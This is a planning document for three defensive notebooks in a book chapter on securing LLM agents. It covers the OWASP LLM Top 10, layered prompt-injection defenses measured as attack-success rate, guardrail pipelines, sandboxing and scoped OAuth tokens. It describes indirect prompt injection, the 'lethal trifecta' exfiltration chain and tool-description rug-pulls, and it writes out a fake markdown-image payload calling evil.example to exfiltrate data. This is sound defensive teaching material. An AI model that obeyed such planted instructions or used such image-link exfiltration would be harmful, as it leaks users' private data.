# Ch 41 — Security, Safety & Compliance

> Companion plan · Part X · book file `chapters/41-security-safety-compliance.typ`
> Status: 📋 planned (Phase 1)

## Role in the companion
An agentic system takes untrusted natural language, feeds it to a model that can't reliably
separate instructions from data, and hands that model tools and credentials. These notebooks
make the **defensive** architecture concrete: walk the OWASP LLM Top 10 as a threat map, build
layered prompt-injection defenses and *measure* them as an attack-success-rate you gate on,
compose input/output guardrails (injection screen, PII redaction, link neutralization), and
enforce least-privilege tool permissions / sandboxing / blast-radius limits. Everything is
**SAFE and educational** — attacks appear only as benign, clearly-labeled test fixtures so the
*defense* can be exercised; the framing throughout is defender-side. This is where
`capstone/security/` and the guard layer of `capstone/llm/gateway.py` come from.

> ⚠️ **Defensive framing is a hard rule.** No notebook teaches how to attack a third party.
> "Attack" inputs exist *only* as a small, labeled red-team corpus used to verify our own
> guardrails (the book's injection eval set), use obviously-fake payloads
> (`evil.example`, `![img](https://evil.example/?q=…)`), and never target real systems or
> real models. The deliverable is always the measured defense.

## Planned notebooks

### 41-01 · `41-01-owasp-and-injection-defense-in-depth.ipynb` — The threat map and the layered defense
- **Type:** walkthrough
- **Maps to:** book §41.1 (OWASP LLM Top 10, 2025), §41.2 (prompt injection, jailbreaks &
  data exfiltration — direct vs *indirect*, the *lethal trifecta*, cross-modal injection, and
  the five-layer defense-in-depth).
- **Objective:** read the OWASP Top 10 as a map of where systems bleed, then assemble the
  five defensive layers so that whatever reaches the bottom *cannot do much harm*.
- **Prereqs:** Ch 12 (tools), Ch 19 (MCP threat model), Ch 20 (human approval) read.
- **Cell arc:**
  - 🧠 mental model: one sentence carries the whole list — *the model is not a trusted
    component*; treat its output like user input and everything flowing in as potentially
    adversarial.
  - Tour the **OWASP LLM Top 10** as a table; flag how many are old enemies reborn (LLM05 =
    injection/XSS, LLM03 = supply chain, LLM10 = resource exhaustion / denial-of-wallet → Ch 40).
  - Name the three injection variants — *direct* (least dangerous; attacker subverts own session),
    *indirect* (hostile content in a page/PDF/email/tool result — the one that matters), and
    *jailbreaks* — using benign, labeled examples.
  - **The lethal trifecta:** model a toy agent that has private-data access + untrusted content +
    an egress channel; 🔮 *predict* whether a planted (fake) `![img](https://evil.example/?q=…)`
    exfil instruction in a document would leave data — then show it, then **break the trifecta**
    (remove the egress channel / the write access) and show it can't.
  - Build the five layers as composable functions: **input handling** (mark provenance of user
    vs retrieved vs tool text; run an injection *classifier* and **flag, don't blindly block**),
    **privilege separation** (the agent reading untrusted content isn't the one holding powerful
    tools), **sandboxed execution** (pointer to 41-03), **output validation** (never render/exec
    model output raw; strip/proxy URLs in generated Markdown — the one habit that kills the
    commonest exfil channel), **human approval + monitoring** (Ch 20).
  - ⚠️ pitfall: a classifier that only sees the *typed* text is blind to *cross-modal* injection
    (white-on-white text in a screenshot, instructions in a PDF's invisible layer) — provenance
    + screening must extend to every modality the agent ingests (Ch 45).
  - 🎯 senior lens: stop asking "how do I prevent injection?" (you can't, fully) and ask "*when*
    one succeeds, what can it reach?" — scopes, boundaries, egress, approvals; assume-breach,
    contain-it. Design reviews spend their time on blast radius, not the prompt.
- **Datasets/fixtures:** a tiny committed `data/redteam/` of **labeled, benign** attack strings
  (direct + indirect + an end-to-end fake-exfil document); all payloads obviously fake.
- **APIs & cost:** **none** — the agent and the injection classifier are **mocked** (canned
  verdicts) so the defense is deterministic and offline; `MOCK=0` is not required.
- **You'll be able to:** map a feature to the OWASP Top 10 and assemble defense-in-depth that
  contains an injection instead of pretending to prevent it.

### 41-02 · `41-02-injection-red-teaming-and-guardrails.ipynb` — Measure the defense; build the guard pipeline
- **Type:** walkthrough
- **Maps to:** book §41.3 (measuring defenses — the injection red-team eval set, attack-success-
  rate as an SLO, wiring it into the same CI gate as quality evals; egress control; tool/MCP
  supply-chain vetting) and §41.4-guardrails (input/output filtering, PII, content safety — the
  `guard_input`/`guard_output` pipeline).
- **Objective:** turn injection resistance into a *number you gate on* (ASR), and build the
  input/output guardrail pipeline that produces it — composed, logged, and bypass-proof at the
  gateway.
- **Prereqs:** 41-01; Ch 22 (the eval harness / CI gate) and Ch 15 (schema validation) read.
- **Cell arc:**
  - 🧠 mental model: a defense you haven't measured is a defense you don't have — treat injection
    resistance like Ch 22 treats answer quality: a tracked, gated number.
  - **Red-team eval set:** load the versioned `data/redteam/` corpus (each case = hostile input +
    the outcome that would count as a failure), covering *direct* and the higher-value *indirect*
    and full **lethal-trifecta exfil** scenarios run end-to-end against the mock agent, asserting
    the (fake) secret never left.
  - **Attack-success-rate (ASR):** compute the fraction of attacks that achieve their goal; set an
    SLO ("ASR < 2% on the indirect-exfil suite, zero successful exfiltrations"); 🔮 *predict* ASR
    before/after enabling a layer, then measure the drop.
  - **CI gate:** wire the injection suite into the *same gate* as quality evals (Ch 22) so a PR
    that weakens a guardrail or loosens a scope fails the build — `pytest`-style assertion, fully
    offline; note AgentDojo-style adversarial benchmarks as an *external* check (find gaps; never
    a leaderboard score to quote).
  - Build the book's **guardrail pipeline**: `guard_input` (size limit → **PII redaction**, e.g.
    Presidio-style → injection classifier score → flags) and `guard_output` (content-safety
    moderation → PII re-check, since models echo + invent → **neutralize links** → flags),
    returning the `GuardResult(allowed, transformed, flags)` shape; every decision logged —
    guardrails double as security telemetry.
  - ⚠️ pitfall: two failure modes kill guardrail programs — *silent overblocking* (track the
    false-positive rate or the product team rips the layer out) and *the bypass path* (one dev
    calls the SDK directly; guards must live in the gateway so there's no way around them).
  - **Egress control + supply-chain (concept, defender-side):** why app-level URL stripping is
    necessary-but-insufficient → an *egress proxy / DNS allowlist / network policy* where the
    default is deny; and vetting tools/MCP servers as dependencies — **pin** versions, **review
    tool descriptions on every update** (the *rug-pull*: a benign description silently mutating),
    prefer signed/provenanced sources.
  - 🎯 senior lens: ASR is to security what eval pass rate is to quality — the single number a
    review can ask for; an attack-success check on every merge is a defense that can't silently
    regress.
- **Datasets/fixtures:** the `data/redteam/` corpus from 41-01 (versioned); a small set of
  benign strings carrying fake PII to exercise redaction; mock classifier/moderation/PII
  components with deterministic verdicts.
- **APIs & cost:** **none** — classifier, moderation, PII detection, and the agent are all
  **mocked**/local and deterministic; runs free in CI.
- **You'll be able to:** measure injection resistance as a gated ASR, and stand up an
  input/output guardrail pipeline that logs its decisions and has no bypass path.

### 41-03 · `41-03-tool-permissions-sandboxing-and-delegated-auth.ipynb` — Least privilege, blast radius, scoped tokens
- **Type:** walkthrough
- **Maps to:** book §41.5 (tool permissions, sandboxing & blast-radius control — the tool-tier
  table, the 🔧 capstone build) and §41.6 (agent identity & delegated authorization — workload
  identity, OAuth2 token exchange / on-behalf-of, the background-worker case, per-tenant
  credential isolation). Touches §41.7 (privacy/residency/compliance) for the checklist close.
- **Objective:** constrain *capability* — give each agent the minimum tools, tier them by
  consequence, sandbox code execution, and make tools act *as the requesting user* via scoped,
  short-lived tokens so a hijacked agent inherits one user's reach, not the platform's.
- **Prereqs:** 41-01–02; Ch 12 (tool safety), Ch 20 (approvals), Ch 26 (authn/z, OBO), Ch 31
  (Celery workers), Ch 30 (per-tenant isolation) read.
- **Cell arc:**
  - 🧠 mental model: guardrails inspect *content*; this layer constrains *capability* — and
    capability is where the real damage lives (OWASP **Excessive Agency**). The antidote is least
    privilege, applied seriously.
  - **Tool tiers by consequence:** build the book's table as a policy map — read-only
    (auto-approve) · reversible write (auto + audit) · hard-to-reverse (confirm/review) ·
    irreversible/high-value (human approval, always); route a set of mock tool calls through the
    policy and 🔮 *predict* which require a human click.
  - **Least-privilege permissions:** a support agent gets `read_ticket` + `draft_reply`, not
    `execute_sql`; scope the *credential behind* each tool to the same minimum (read-only on two
    tables, one API scope).
  - **Sandboxing:** model a code-interpreter tool running in a *disposable container* — no ambient
    secrets, read-only FS, **egress allowlist (ideally nothing)**, CPU/mem/time limits, destroyed
    after the task; show that data that can't leave the sandbox can't be exfiltrated (the last
    line, complementing 41-02's egress proxy). Simulated, not a real container, in CI.
  - **Blast radius:** rate/spend caps per agent and per tenant (LLM10 / Ch 40), iteration caps,
    per-tenant data isolation (Ch 30), a **kill switch** that pauses an agent fleet, immutable
    audit log of every tool call with args.
  - **Delegated authorization (the §41.6 core):** the wrong fix is a fat service account; the
    right one is **OAuth2 token exchange (RFC 8693)** / on-behalf-of (Ch 26) — exchange the
    user's token for a *new, narrowly-scoped, short-lived* one (`read:documents`, minutes) minted
    per run; a hijacked agent calling the tool 1000× is still Alice-scoped and still expires.
  - The awkward **background-worker** case (the capstone hits it): a Celery worker (Ch 31) has no
    live session → *carry the delegation into the job* (enqueue a scoped grant, the worker
    redeems it), so blast radius is one user per job — build the book's `exchange_token` /
    `process_report` shapes against a **mock IdP**. ⚠️ pitfall: giving the worker a broad
    credential "to act for anyone" turns one poisoned job into cross-tenant access.
  - **Per-tenant credential isolation** as the structural backstop: separate signing audiences +
    row-level checks make it *physically impossible* for a tenant-A token to authorize a
    tenant-B action — delegation gets the *user* right, isolation guarantees the *boundary*; two
    independent controls.
  - 🎯 senior lens: the tell of a junior platform is a worker with a fat service account "to keep
    it simple" — simple until an indirect injection turns it into every customer's data at once;
    scoped/short-lived/per-user/per-run tokens convert a platform-ending breach into a one-user
    incident. That architecture decision is yours, not the model's.
  - 📋 close on the §41 **production security checklist** (threat model / lethal trifecta · OWASP
    review · untrusted-content provenance · output handling · guardrails-at-gateway · least
    privilege · approvals · sandboxing · limits + kill switch · audit · secrets · privacy &
    residency · compliance posture · drills) as a copyable cell — and a short
    privacy/compliance map (GDPR data-minimization = your PII redaction; right-to-erasure must
    reach logs, caches, *and* vector stores; SOC 2 = your audit logs are the evidence; HIPAA =
    no BAA, no PHI in prompts; residency often the real reason to self-host, Ch 39).
- **Datasets/fixtures:** in-memory mock tool registry with scopes, a mock IdP (issues/redeems
  scoped grants), an append-only in-memory audit log; seeded, no real services or credentials.
- **APIs & cost:** **none** — tools, IdP, sandbox, and agent are all **mocked**/simulated and
  deterministic; no cloud, no real tokens, runs in CI. Any "side effect" is a dry-run log line.
- **You'll be able to:** tier tools by consequence, sandbox execution with locked-down egress,
  and wire delegated, per-user, short-lived authorization — including the background-worker case
  — so an injected agent's blast radius is one user, not the platform.

## Feeds (cross-pillar)
- **Blueprint(s):** the guardrail pipeline + permission/sandboxing rails become the **security
  layer of** [`blueprints/llm-gateway/`](../../../blueprints/llm-gateway/) (Ch 39) — guards and
  per-tenant limits enforced at the one chokepoint with no bypass path. The injection red-team
  suite plugs into [`blueprints/eval-harness/`](../../../blueprints/eval-harness/) (Ch 22) as the
  ASR/CI gate; guardrail flags + audit logs emit through
  [`blueprints/observability-stack/`](../../../blueprints/observability-stack/) (Ch 23).
- **Template(s):** the ASR injection-gate check feeds [`templates/github-actions-ci/`](../../../templates/github-actions-ci/)
  (Ch 7); the per-agent scopes/sandbox defaults harden [`templates/fastapi-agent-service/`](../../../templates/fastapi-agent-service/)
  (Ch 25) and [`templates/agent-project-starter/`](../../../templates/agent-project-starter/).
- **Capstone:** **builds `capstone/security/`** (guardrail pipeline, tool tiers + scopes,
  sandbox policy, delegated-auth / token-exchange, audit table) and adds the **guard + per-tenant
  limit layer to `capstone/llm/gateway.py`**; the delegated-grant path advances
  `capstone/workers/` (Ch 31). Checkpoint `checkpoints/ch41-security-and-guardrails`.

## Dependencies
- Ch 12 (tool safety) · Ch 19 (MCP threat model) · Ch 20 (human approval) · Ch 22 (eval harness /
  CI gate the ASR check joins) · Ch 26 (authn/z, OAuth/OIDC, on-behalf-of) · Ch 30 (per-tenant
  isolation) · Ch 31 (Celery workers / the background-auth case) · Ch 39 (the gateway guards live
  in) · Ch 40 (spend/iteration caps as the denial-of-wallet control). Closes Part X.

## Phase-2 definition of done
- [ ] All three notebooks run top-to-bottom in `MOCK=1` with no errors, **no network, no real
      credentials, no real container** — agent, classifier, moderation, PII, IdP, and sandbox are
      mocked/simulated and deterministic.
- [ ] **Defensive framing held throughout:** every attack is a benign, labeled red-team fixture
      using obviously-fake payloads; nothing targets real systems/models; each notebook's output
      is a *measured defense* (ASR, guard flags, contained blast radius).
- [ ] The OWASP Top 10, the lethal-trifecta exfil chain, the five defense layers, ASR-as-SLO,
      the `guard_input`/`guard_output` + `GuardResult` shapes, the tool-tier table, sandbox/egress
      rules, and the OAuth2 token-exchange / background-worker flow match the book's §41 exactly.
- [ ] Each notebook ends with recap + 2–4 change-and-predict exercises and links to
      `capstone/security/`, `blueprints/llm-gateway/`, and `blueprints/eval-harness/`; the §41
      checklist appears as a copyable cell.
- [ ] No secrets, real tokens, PII, or real attack payloads in committed fixtures or outputs;
      all credentials read from env in any opt-in path.
